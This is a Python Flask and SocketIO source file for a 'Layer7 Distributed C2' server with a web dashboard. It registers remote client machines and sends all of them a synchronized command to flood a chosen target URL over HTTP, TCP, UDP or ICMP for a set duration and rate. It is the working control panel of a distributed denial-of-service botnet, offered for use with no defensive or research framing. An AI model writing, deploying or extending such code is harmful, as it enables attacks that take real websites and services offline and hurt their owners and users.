#!/usr/bin/env python3
"""
C2 Server - Controls ALL clients to run LAYER7.py simultaneously
"""
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import json
import threading
import time
import os
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional
# Add this line (around line 10-15):
PORT = int(os.environ.get('PORT', 5000))  # Render uses PORT env variable
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store connected clients
clients = {}
attacks = {}
client_lock = threading.Lock()
attack_lock = threading.Lock()

@dataclass
class ClientInfo:
    id: str
    name: str
    hostname: str
    platform: str
    cpu_count: int
    memory_total: int
    connected_at: datetime
    status: str = "idle"
    current_attack: Optional[str] = None
    last_seen: datetime = None
    stats: Dict = None
    
    def __post_init__(self):
        if self.stats is None:
            self.stats = {"requests": 0, "rps": 0, "success": 0}
        if self.last_seen is None:
            self.last_seen = self.connected_at

@dataclass 
class AttackInfo:
    id: str
    target: str
    method: str
    duration: int
    rps: int
    created_at: datetime
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    status: str = "pending"
    client_count: int = 0
    completed_clients: List[str] = None
    results: Dict = None
    
    def __post_init__(self):
        if self.completed_clients is None:
            self.completed_clients = []
        if self.results is None:
            self.results = {
                "total_requests": 0,
                "total_success": 0,
                "avg_rps": 0,
                "client_results": {}
            }

# Web interface HTML
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Layer7 Distributed C2</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #0a0a0a; color: #00ff00; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #00ff00; padding-bottom: 20px; }
        .panel { background: #111; border: 1px solid #00ff00; padding: 20px; margin: 20px 0; border-radius: 5px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat-box { background: #222; padding: 15px; border-radius: 5px; text-align: center; }
        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .client-card { background: #222; padding: 15px; border-radius: 5px; border-left: 4px solid #00ff00; }
        .client-card.attacking { border-color: #ff4444; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
        .attack-form input, .attack-form select { padding: 10px; margin: 5px; width: 100%; max-width: 300px; }
        button { padding: 12px 24px; background: #00aa00; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #00cc00; }
        button.danger { background: #aa0000; }
        button.danger:hover { background: #cc0000; }
        .log { background: #000; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: auto; }
        .log-entry { margin: 5px 0; padding: 5px; border-left: 3px solid #00ff00; }
        .log-error { border-color: #ff0000; color: #ff6666; }
        .log-success { border-color: #00ff00; color: #00ff00; }
        .log-warning { border-color: #ffff00; color: #ffff00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ Layer7 Distributed Attack Controller</h1>
            <p>Control ALL clients simultaneously to attack a single target</p>
        </div>
        
        <div class="panel">
            <h2>📊 Server Status</h2>
            <div class="stats-grid">
                <div class="stat-box">
                    <h3 id="client-count">0</h3>
                    <p>Connected Clients</p>
                </div>
                <div class="stat-box">
                    <h3 id="attacking-count">0</h3>
                    <p>Attacking Now</p>
                </div>
                <div class="stat-box">
                    <h3 id="total-requests">0</h3>
                    <p>Total Requests</p>
                </div>
                <div class="stat-box">
                    <h3 id="active-attack">None</h3>
                    <p>Active Attack</p>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>🎯 Launch Distributed Attack</h2>
            <div class="attack-form">
                <div style="margin: 15px 0;">
                    <label>Target URL:</label><br>
                    <input type="text" id="target" placeholder="https://example.com" value="https://example.com">
                </div>
                <div style="margin: 15px 0;">
                    <label>Attack Layer:</label><br>
                    <select id="layer">
                        <option value="http">Layer 7 (HTTP)</option>
                        <option value="tcp">Layer 4 (TCP)</option>
                        <option value="udp">Layer 4 (UDP)</option>
                        <option value="icmp">Layer 3 (ICMP)</option>
                    </select>
                </div>
                <div style="margin: 15px 0;">
                    <label>Duration (seconds):</label><br>
                    <input type="number" id="duration" value="60" min="10" max="3600">
                </div>
                <div style="margin: 15px 0;">
                    <label>Requests Per Second (per client):</label><br>
                    <input type="number" id="rps" value="100" min="1" max="10000">
                </div>
                <div style="margin: 20px 0;">
                    <button onclick="startAttack()">🚀 ATTACK ALL CLIENTS</button>
                    <button class="danger" onclick="stopAttack()">🛑 STOP ALL ATTACKS</button>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>💻 Connected Clients (<span id="client-list-count">0</span>)</h2>
            <div class="client-grid" id="clients-container">
                <!-- Clients will appear here -->
                <div style="text-align: center; padding: 40px; color: #666;">
                    No clients connected. Run c2_client.py on computers.
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>📝 Attack Log</h2>
            <div class="log" id="log-container">
                <!-- Log entries will appear here -->
                <div class="log-entry">Server started. Waiting for clients...</div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        const socket = io();
        let currentAttackId = null;
        
        // Socket event handlers
        socket.on('connect', () => {
            addLog('Connected to server', 'success');
        });
        
        socket.on('client_connected', (data) => {
            addLog(`Client connected: ${data.client.name}`, 'success');
            updateClientList();
        });
        
        socket.on('client_disconnected', (data) => {
            addLog(`Client disconnected: ${data.client_id}`, 'warning');
            updateClientList();
        });
        
        socket.on('attack_started', (data) => {
            currentAttackId = data.attack_id;
            addLog(`🚀 ATTACK STARTED: ${data.attack.target}`, 'success');
            addLog(`   Method: ${data.attack.method} | Duration: ${data.attack.duration}s | Clients: ${data.attack.client_count}`);
            updateStats();
        });
        
        socket.on('client_attack_start', (data) => {
            addLog(`Client ${data.client_id} started attacking ${data.target}`);
            updateClientList();
        });
        
        socket.on('client_attack_progress', (data) => {
            // Update client stats in real-time
            updateClientList();
        });
        
        socket.on('client_attack_complete', (data) => {
            addLog(`✅ Client ${data.client_id} completed: ${data.results.requests} requests`);
            updateClientList();
        });
        
        socket.on('attack_completed', (data) => {
            addLog(`🎉 ALL CLIENTS COMPLETED ATTACK!`, 'success');
            addLog(`   Total requests: ${data.results.total_requests.toLocaleString()}`);
            addLog(`   Success rate: ${data.results.total_success}%`);
            addLog(`   Average RPS: ${data.results.avg_rps.toFixed(1)}`);
            currentAttackId = null;
            updateStats();
        });
        
        socket.on('system_stats', (data) => {
            updateStats(data);
        });
        
        // Functions
        function addLog(message, type = 'info') {
            const log = document.getElementById('log-container');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        }
        
        function updateStats(stats = null) {
            if (stats) {
                document.getElementById('client-count').textContent = stats.clients.total;
                document.getElementById('attacking-count').textContent = stats.clients.attacking;
                document.getElementById('total-requests').textContent = stats.attacks.total_requests.toLocaleString();
                document.getElementById('active-attack').textContent = stats.attacks.active > 0 ? 'Running' : 'None';
            }
        }
        
        function updateClientList() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('clients-container');
                    const count = document.getElementById('client-list-count');
                    
                    count.textContent = data.total;
                    
                    if (data.total === 0) {
                        container.innerHTML = `
                            <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
                                No clients connected. Run c2_client.py on computers.
                            </div>
                        `;
                        return;
                    }
                    
                    container.innerHTML = '';
                    data.clients.forEach(client => {
                        const card = document.createElement('div');
                        card.className = `client-card ${client.status === 'attacking' ? 'attacking' : ''}`;
                        card.innerHTML = `
                            <h3>${client.name} <span style="float: right; font-size: 0.8em; color: ${client.status === 'attacking' ? '#ff4444' : '#00ff00'}">${client.status.toUpperCase()}</span></h3>
                            <p><strong>Host:</strong> ${client.hostname}</p>
                            <p><strong>Platform:</strong> ${client.platform}</p>
                            <p><strong>CPU:</strong> ${client.cpu_count} cores</p>
                            <p><strong>RAM:</strong> ${Math.round(client.memory_total / 1024 / 1024 / 1024)} GB</p>
                            <p><strong>Connected:</strong> ${new Date(client.connected_at).toLocaleTimeString()}</p>
                            ${client.current_attack ? `<p><strong>Attack:</strong> ${client.current_attack}</p>` : ''}
                            ${client.stats.requests > 0 ? `<p><strong>Requests:</strong> ${client.stats.requests.toLocaleString()}</p>` : ''}
                            ${client.stats.rps > 0 ? `<p><strong>RPS:</strong> ${client.stats.rps.toFixed(1)}</p>` : ''}
                        `;
                        container.appendChild(card);
                    });
                });
        }
        
        function startAttack() {
            const target = document.getElementById('target').value;
            const layer = document.getElementById('layer').value;
            const duration = parseInt(document.getElementById('duration').value);
            const rps = parseInt(document.getElementById('rps').value);
            
            if (!target) {
                alert('Please enter a target URL');
                return;
            }
            
            fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target, layer, duration, rps})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    addLog(`Attack command sent: ${data.message}`, 'success');
                } else {
                    addLog(`Attack failed: ${data.error}`, 'error');
                }
            });
        }
        
        function stopAttack() {
            fetch('/api/attack/stop', {method: 'POST'})
                .then(r => r.json())
                .then(data => {
                    addLog(data.message, data.success ? 'success' : 'error');
                });
        }
        
        // Initial load
        updateStats();
        updateClientList();
        setInterval(updateClientList, 5000);
        
        // Auto-scroll log
        setInterval(() => {
            const log = document.getElementById('log-container');
            log.scrollTop = log.scrollHeight;
        }, 100);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Web interface"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/clients')
def get_clients():
    """Get all connected clients"""
    with client_lock:
        return jsonify({
            "success": True,
            "total": len(clients),
            "clients": [asdict(client) for client in clients.values()]
        })

@app.route('/api/stats')
def get_stats():
    """Get server statistics"""
    with client_lock:
        total_clients = len(clients)
        attacking = len([c for c in clients.values() if c.status == 'attacking'])
    
    with attack_lock:
        active_attacks = len([a for a in attacks.values() if a.status in ['running', 'pending']])
        total_requests = sum(a.results["total_requests"] for a in attacks.values())
    
    return jsonify({
        "success": True,
        "clients": {"total": total_clients, "attacking": attacking},
        "attacks": {"active": active_attacks, "total_requests": total_requests}
    })

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """Start attack on ALL connected clients"""
    try:
        data = request.json
        target = data['target']
        layer = data.get('layer', 'http')
        duration = int(data.get('duration', 60))
        rps = int(data.get('rps', 100))
        
        # Create attack
        attack_id = f"attack_{int(time.time())}"
        
        with attack_lock:
            attack = AttackInfo(
                id=attack_id,
                target=target,
                method=layer,
                duration=duration,
                rps=rps,
                created_at=datetime.now(),
                status="starting"
            )
            attacks[attack_id] = attack
        
        # Get all connected clients
        with client_lock:
            connected_clients = list(clients.keys())
            attack.client_count = len(connected_clients)
            
            if attack.client_count == 0:
                return jsonify({"success": False, "error": "No clients connected"}), 400
            
            # Send attack command to ALL clients simultaneously
            for client_id in connected_clients:
                clients[client_id].status = "attacking"
                clients[client_id].current_attack = attack_id
                
                # Send SocketIO event
                socketio.emit('attack_command', {
                    'attack_id': attack_id,
                    'target': target,
                    'method': layer,
                    'duration': duration,
                    'rps': rps,
                    'command': 'start'
                }, room=client_id)
        
        attack.status = "running"
        attack.started_at = datetime.now()
        
        # Broadcast attack started
        socketio.emit('attack_started', {
            'attack_id': attack_id,
            'attack': asdict(attack)
        }, broadcast=True)
        
        return jsonify({
            "success": True,
            "message": f"Attack started on {attack.client_count} clients",
            "attack_id": attack_id,
            "client_count": attack.client_count
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Stop all attacks"""
    with client_lock:
        for client in clients.values():
            client.status = "idle"
            client.current_attack = None
            
            # Send stop command
            socketio.emit('attack_command', {
                'command': 'stop'
            }, room=client.id)
    
    with attack_lock:
        for attack in attacks.values():
            if attack.status == "running":
                attack.status = "stopped"
                attack.completed_at = datetime.now()
    
    socketio.emit('attack_stopped', {'message': 'All attacks stopped'}, broadcast=True)
    return jsonify({"success": True, "message": "All attacks stopped"})

# SocketIO Events
@socketio.on('connect')
def handle_connect():
    """Client connected"""
    client_id = request.sid
    print(f"[+] Client connected: {client_id}")

@socketio.on('client_register')
def handle_client_register(data):
    """Client registration"""
    client_id = request.sid
    
    with client_lock:
        client = ClientInfo(
            id=client_id,
            name=data.get('name', f'Client_{client_id[:8]}'),
            hostname=data.get('hostname', 'Unknown'),
            platform=data.get('platform', 'Unknown'),
            cpu_count=data.get('cpu_count', 1),
            memory_total=data.get('memory_total', 0),
            connected_at=datetime.now()
        )
        clients[client_id] = client
    
    # Send welcome
    emit('welcome', {'message': 'Connected to C2 Server', 'client_id': client_id})
    
    # Broadcast new client
    socketio.emit('client_connected', {
        'client': asdict(client),
        'total_clients': len(clients)
    }, broadcast=True)

@socketio.on('client_stats')
def handle_client_stats(data):
    """Client statistics update"""
    client_id = request.sid
    
    with client_lock:
        if client_id in clients:
            clients[client_id].last_seen = datetime.now()
            clients[client_id].stats.update(data.get('stats', {}))

@socketio.on('attack_started')
def handle_client_attack_start(data):
    """Client started attack"""
    client_id = request.sid
    attack_id = data.get('attack_id')
    
    socketio.emit('client_attack_start', {
        'client_id': client_id,
        'target': data.get('target'),
        'attack_id': attack_id
    }, broadcast=True)

@socketio.on('attack_progress')
def handle_attack_progress(data):
    """Attack progress update"""
    client_id = request.sid
    
    socketio.emit('client_attack_progress', {
        'client_id': client_id,
        'progress': data
    }, broadcast=True)

@socketio.on('attack_complete')
def handle_attack_complete(data):
    """Client completed attack"""
    client_id = request.sid
    attack_id = data.get('attack_id')
    results = data.get('results', {})
    
    # Update client status
    with client_lock:
        if client_id in clients:
            clients[client_id].status = "idle"
            clients[client_id].current_attack = None
            clients[client_id].stats.update(results)
    
    # Update attack
    with attack_lock:
        if attack_id in attacks:
            attack = attacks[attack_id]
            attack.completed_clients.append(client_id)
            attack.results["client_results"][client_id] = results
            attack.results["total_requests"] += results.get('requests', 0)
            attack.results["total_success"] += results.get('success', 0)
            
            # Check if all clients completed
            if len(attack.completed_clients) >= attack.client_count:
                attack.status = "completed"
                attack.completed_at = datetime.now()
                
                # Calculate averages
                if attack.client_count > 0:
                    attack.results["avg_rps"] = attack.results["total_requests"] / attack.duration
                    attack.results["total_success"] = (attack.results["total_success"] / attack.client_count) if attack.client_count > 0 else 0
                
                # Broadcast completion
                socketio.emit('attack_completed', {
                    'attack_id': attack_id,
                    'results': attack.results
                }, broadcast=True)
    
    socketio.emit('client_attack_complete', {
        'client_id': client_id,
        'results': results
    }, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Client disconnected"""
    client_id = request.sid
    
    with client_lock:
        if client_id in clients:
            client = clients.pop(client_id)
            print(f"[-] Client disconnected: {client.name}")
            
            socketio.emit('client_disconnected', {
                'client_id': client_id,
                'total_clients': len(clients)
            }, broadcast=True)

def background_tasks():
    """Background tasks for monitoring"""
    while True:
        try:
            # Update system stats
            with client_lock:
                total = len(clients)
                attacking = len([c for c in clients.values() if c.status == 'attacking'])
            
            with attack_lock:
                active = len([a for a in attacks.values() if a.status in ['running', 'pending']])
                total_requests = sum(a.results["total_requests"] for a in attacks.values())
            
            socketio.emit('system_stats', {
                'clients': {'total': total, 'attacking': attacking},
                'attacks': {'active': active, 'total_requests': total_requests}
            }, broadcast=True)
            
            time.sleep(2)
        except:
            time.sleep(5)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════╗
    ║    LAYER7 DISTRIBUTED C2 SERVER     ║
    ║    Control ALL clients simultaneously║
    ║    [USE AT YOUR OWN RISK]           ║
    ╚══════════════════════════════════════╝
    """)
    
    # Start background tasks
    threading.Thread(target=background_tasks, daemon=True).start()
    
    print(f"[📡] Server starting on port {PORT}")
    print(f"[🔗] Web interface: http://localhost:{PORT}")
    print(f"[💻] Run c2_client.py on ALL computers")
    print(f"[⚡] Attacks will run on ALL clients simultaneously\n")
    
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)


